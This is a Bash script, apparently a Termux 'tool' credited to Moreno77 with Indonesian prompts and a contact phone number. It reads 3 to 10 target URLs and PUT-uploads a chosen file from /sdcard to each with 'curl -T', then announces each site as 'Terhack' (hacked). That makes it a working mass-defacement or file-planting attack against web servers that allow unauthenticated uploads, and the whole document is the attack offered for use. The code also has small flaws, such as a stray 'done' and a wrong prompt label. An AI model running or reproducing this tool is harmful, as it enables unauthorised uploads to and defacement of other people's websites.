#!/bin/bash
#version 1.0

clear
# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'
green="\033[32;1m"

cowsay -f eyes "Moreno77" | lolcat
figlet -f slant "Moreno77" | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By Moreno77       ]=====>" | lolcat
echo  "    <=====[  Concact Me : +6285606753071  ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat

sleep 1
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
clear
sleep 1
exit
}


lagi=1
while [ $lagi -lt 6 ];
do
echo "Masukan Jumlah Target, 3-10 Target" | lolcat
echo "99. Exit" | lolcat
echo $green
read -p "[?] Input => " pil;

case $pil in
1) echo "[*] Pilih 3 Sampai 10 Njink :V" | lolcat
echo " "
;;
2)  echo "[*] Pilih 3 Sampai 10 Njink :V" | lolcat
echo " "
;;
3) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat

;;
4) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat

;;
5) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
read -p "[?] Masukan Terget 5 => " a5;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
curl -T /sdcard/$sc $a5
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat
echo "[!] Terhack => " $a5/$sc | lolcat
;;
6) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
read -p "[?] Masukan Terget 5 => " a5;
read -p "[?] Masukan Terget 6 => " a6;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
curl -T /sdcard/$sc $a5
curl -T /sdcard/$sc $a6
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat
echo "[!] Terhack => " $a5/$sc | lolcat
echo "[!] Terhack => " $a6/$sc | lolcat
;;
7) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
read -p "[?] Masukan Terget 5 => " a5;
read -p "[?] Masukan Terget 6 => " a6;
read -p "[?] Masukan Terget 7 => " a7;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
curl -T /sdcard/$sc $a5
curl -T /sdcard/$sc $a6
curl -T /sdcard/$sc $a7
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat
echo "[!] Terhack => " $a5/$sc | lolcat
echo "[!] Terhack => " $a6/$sc | lolcat
echo "[!] Terhack => " $a7/$sc | lolcat
;;
8) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
read -p "[?] Masukan Terget 5 => " a5;
read -p "[?] Masukan Terget 6 => " a6;
read -p "[?] Masukan Terget 7 => " a7;
read -p "[?] Masukan Terget 8 => " a8;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
curl -T /sdcard/$sc $a5
curl -T /sdcard/$sc $a6
curl -T /sdcard/$sc $a7
curl -T /sdcard/$sc $a8
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat
echo "[!] Terhack => " $a5/$sc | lolcat
echo "[!] Terhack => " $a6/$sc | lolcat
echo "[!] Terhack => " $a7/$sc | lolcat
echo "[!] Terhack => " $a8/$sc | lolcat
;;
9) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
read -p "[?] Masukan Terget 5 => " a5;
read -p "[?] Masukan Terget 6 => " a6;
read -p "[?] Masukan Terget 7 => " a7;
read -p "[?] Masukan Terget 8 => " a8;
read -p "[?] Masukan Terget 9 => " a9;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
curl -T /sdcard/$sc $a5
curl -T /sdcard/$sc $a6
curl -T /sdcard/$sc $a7
curl -T /sdcard/$sc $a8
curl -T /sdcard/$sc $a9
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat
echo "[!] Terhack => " $a5/$sc | lolcat
echo "[!] Terhack => " $a6/$sc | lolcat
echo "[!] Terhack => " $a7/$sc | lolcat
echo "[!] Terhack => " $a8/$sc | lolcat
echo "[!] Terhack => " $a9/$sc | lolcat
;;
10) read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Terget 1 => " a1;
read -p "[?] Masukan Terget 2 => " a2;
read -p "[?] Masukan Terget 3 => " a3;
read -p "[?] Masukan Terget 4 => " a4;
read -p "[?] Masukan Terget 5 => " a5;
read -p "[?] Masukan Terget 6 => " a6;
read -p "[?] Masukan Terget 7 => " a7;
read -p "[?] Masukan Terget 8 => " a8;
read -p "[?] Masukan Terget 9 => " a9;
read -p "[?] Masukan Terget 9 => " a10;
curl -T /sdcard/$sc $a1
curl -T /sdcard/$sc $a2
curl -T /sdcard/$sc $a3
curl -T /sdcard/$sc $a4
curl -T /sdcard/$sc $a5
curl -T /sdcard/$sc $a6
curl -T /sdcard/$sc $a7
curl -T /sdcard/$sc $a8
curl -T /sdcard/$sc $a9
curl -T /sdcard/$sc $a10
echo "[!] Terhack => " $a1/$sc | lolcat
echo "[!] Terhack => " $a2/$sc | lolcat
echo "[!] Terhack => " $a3/$sc | lolcat
echo "[!] Terhack => " $a4/$sc | lolcat
echo "[!] Terhack => " $a5/$sc | lolcat
echo "[!] Terhack => " $a6/$sc | lolcat
echo "[!] Terhack => " $a7/$sc | lolcat
echo "[!] Terhack => " $a8/$sc | lolcat
echo "[!] Terhack => " $a9/$sc | lolcat
echo "[!] Terhack => " $a10/$sc | lolcat
;;
99) sh Moreno77.sh
;;

esac
done
done
